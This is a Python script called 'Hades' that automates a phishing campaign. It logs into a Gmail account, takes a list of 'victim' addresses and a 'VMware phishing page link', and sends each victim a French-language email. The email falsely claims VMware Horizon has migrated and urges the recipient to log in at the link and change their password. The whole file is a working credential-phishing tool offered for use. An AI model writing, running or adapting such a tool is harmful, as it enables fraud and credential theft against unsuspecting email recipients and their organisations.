# Hades

from smtplib import SMTP_SSL
from email.message import EmailMessage
from pystyle import Add, Anime, Colorate, Colors, Col, Center, System, Write


System.Title('Hades')
System.Size(140, 40)

hades = r'''
  ::   .:    :::.   :::::::-.  .,::::::   .::::::.
 ,;;   ;;,   ;;`;;   ;;,   `';,;;;;''"'  ;;;`    `
,[[[,,,[[[  ,[[ '[[, `[[     [[ [[cccc   '[==/[[[[,
"$$$"""$$$ c$$$cc$$$c $$,    $$ $$""""     '"'    $
 888   "88o 888   888 888_,o8P' 888oo,__  88b    dP
 MMM    YMM YMM   ""` MMMMP"`   """"YUMMM  "YMmMY"
'''

mode = "[$; [$; [$; Phishing ;$] ;$] ;$]"


ascii = r'''
                ::   .:    :::.   :::::::-.  .,::::::   .::::::.
               ,;;   ;;,   ;;`;;   ;;,   `';,;;;;''"'  ;;;`    `
              ,[[[,,,[[[  ,[[ '[[, `[[     [[ [[cccc   '[==/[[[[,
              "$$$"""$$$ c$$$cc$$$c $$,    $$ $$""""     '"'    $
               888   "88o 888   888 888_,o8P' 888oo,__  88b    dP
               MMM    YMM YMM   ""` MMMMP"`   """"YUMMM  "YMmMY"
                          ___
  .::.                   ( ((
 'H .-;-.-.-.-.-.-.-.-.-/| ((::::::::::::::::::::::::::::::::::::::::::::::.._
(D ( ( ( ( ( ( ( ( ( ( ( |  ))   -====================================-      _.>
 `S `-;-`-`-`-`-`-`-`-`-\| ((::::::::::::::::::::::::::::::::::::::::::::::''
  `::'                    \ \(
                           ) ))
                          (_(('''[1:]







def mkmsg(f: str, t: str):
    msg = EmailMessage()
    msg['from'] = f
    msg['subject'] = "Migration de votre site VMware Horizon"
    msg.set_content(content)
    msg['to'] = t
    return msg

def sendmsg(email: str, psd: str, victims: list):

    with SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(email, psd)

        for victim in victims:
            if victim.strip():
                msg = mkmsg(email, victim)
                smtp.send_message(msg)

def main():
    global content

    System.Clear()
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(hades)))
    print()
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(mode)))
    print('\n'*3)
    email = Write.Input("Enter your email address -> ", Colors.red_to_purple, interval=0.0025)
    password = Write.Input("Enter your password -> ", Colors.red_to_purple, interval=0.0025)
    
    try:
        with SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(email, password)
    except:
        Colorate.Error("Error! Your credentials are invalid, or the 'insecure applications' mode isn't activated in your GMail account!\nTutorial on how to active it: https://www.youtube.com/watch?v=FVi-m1qmJD0<")

    Write.Print("\nConnected to your GMail account!\n", Colors.blue_to_purple, interval=0.0025)

    victim = Write.Input("\nEnter the victim's email address (if more than one, separe them with ':') -> ",  Colors.red_to_purple, interval=0.0025).split(':')

    adr = Write.Input("\nEnter the VMware phishing page link -> ",  Colors.red_to_purple, interval=0.0025).split(':')

    

    content = f"""
    Ceci est un message destiné à tous les utilisateurs enregistrés sur VMware Horizon.
    Le site internet a été migré à l'adresse suivante: {adr}, veuillez vous connecter avec votre compte actuel puis changer de mot de passe, pour des mesures de sécurité.
    Si votre mot de passe est invalide, veuillez contacter votre administrateur.

    Pour consulter la politique de confidentialité, veuillez vous rendre à cette adresse https://www.vmware.com/help/privacy.html.
    """[1:]

    sendmsg(email, password, victim)

    Write.Input("\n\n\nDone!", Colors.blue_to_purple, interval=0.0025)


if __name__ == '__main__':
    Anime.Fade(Center.Center(ascii), Colors.red_to_purple,
               Colorate.Vertical, time=True, enter=True)
    while True:
        try:
            main()
        except Exception as e:
            Colorate.Error(str(e))
